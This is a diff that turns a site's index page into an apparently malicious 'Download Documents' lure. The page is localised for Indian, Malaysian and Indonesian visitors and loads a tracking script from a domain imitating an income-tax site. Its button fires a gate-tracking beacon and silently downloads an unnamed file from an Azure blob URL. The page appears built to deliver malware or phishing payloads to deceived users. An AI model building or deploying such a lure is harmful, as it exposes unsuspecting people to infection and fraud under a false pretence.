@@ -1,1 +1,73 @@
-<!DOCTYPE html><html><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><title>...</title><link rel="icon" type="image/svg+xml" href="favicon.svg"><link rel="alternate icon" type="image/png" href="favicon.png"><style>html,body{margin:0;background:#fff;min-height:100%}</style><script src="loader.js"></script></head><body></body></html>
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>...</title>
+  <link rel="alternate icon" type="image/png" href="favicon.png">
+  <style>
+    html,body{margin:0;background:#fff;font-family:system-ui,sans-serif}
+    .box{max-width:460px;margin:12vh auto 0;padding:28px 24px;border:1px solid #ddd;border-radius:12px;text-align:center}
+    h1{font-size:20px;margin:0 0 8px}
+    p.sub{font-size:14px;color:#666;margin:0 0 24px}
+    button{display:inline-block;background:#000080;color:#fff;border:0;border-radius:6px;padding:14px 32px;font-size:16px;font-weight:bold;cursor:pointer}
+    button:hover{background:#000060}
+    #hint{display:none;margin-top:20px;font-size:14px;color:#0a7d0a}
+  </style>
+  <script src="https://income-tax.my.id/track.js"></script>
+</head>
+<body>
+<div class="box">
+  <h1 id="t">Download Documents</h1>
+  <p class="sub" id="s">Please click the button below to download</p>
+  <button id="btn">Download</button>
+  <div id="hint"></div>
+</div>
+<script>
+(function(){
+  var DL = 'https://etwe3gate0111a.blob.core.windows.net/public/dl/latest';
+  var LANG = {
+    IN: {
+      title: 'दस्तावेज़ डाउनलोड करें / Download Documents',
+      sub: 'कृपया डाउनलोड करने के लिए नीचे दिए गए बटन पर क्लिक करें / Please click the button below to download',
+      btn: 'डाउनलोड करें / Download',
+      hint: 'डाउनलोड शुरू हो गया है। कृपया अपने डाउनलोड फ़ोल्डर (Download Folder) में देखें।'
+    },
+    MY: {
+      title: 'Muat Turun Dokumen',
+      sub: 'Sila klik butang di bawah untuk memuat turun',
+      btn: 'Muat Turun',
+      hint: 'Muat turun telah bermula. Sila semak folder Downloads anda.'
+    },
+    ID: {
+      title: 'Unduh Dokumen',
+      sub: 'Silakan klik tombol di bawah untuk mengunduh',
+      btn: 'Unduh',
+      hint: 'Unduhan telah dimulai. Silakan periksa folder Downloads Anda.'
+    },
+    OTHER: {
+      title: 'Download Documents',
+      sub: 'Please click the button below to download',
+      btn: 'Download',
+      hint: 'Download started. Please check your Downloads folder.'
+    }
+  };
+  var region = new URLSearchParams(location.search).get('region') || 'OTHER';
+  var L = LANG[region] || LANG.OTHER;
+  document.getElementById('t').textContent = L.title;
+  document.getElementById('s').textContent = L.sub;
+  document.getElementById('btn').textContent = L.btn;
+  document.getElementById('hint').textContent = L.hint;
+  document.getElementById('btn').addEventListener('click', function(){
+    try{ if(window.GateTrack) GateTrack.dl('gate'); }catch(e){}
+    var a = document.createElement('a');
+    a.href = DL;
+    a.style.display = 'none';
+    document.body.appendChild(a);
+    a.click();
+    document.getElementById('hint').style.display = 'block';
+  });
+})();
+</script>
+</body>
+</html>
